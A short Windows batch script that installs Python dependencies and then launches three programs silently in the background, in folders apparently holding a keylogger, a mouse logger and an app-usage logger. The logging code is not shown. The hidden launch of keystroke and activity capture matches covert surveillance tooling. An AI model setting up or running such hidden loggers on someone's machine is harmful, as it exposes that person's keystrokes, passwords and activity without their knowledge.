@echo off
pip install -r requirement.txt
cd ./Python_Keylogger/
start /B pythonw.exe main.py
cd ../mouse logger/
start /B pythonw.exe main.py
cd ../app usage/
start /B pythonw.exe main.py
@pause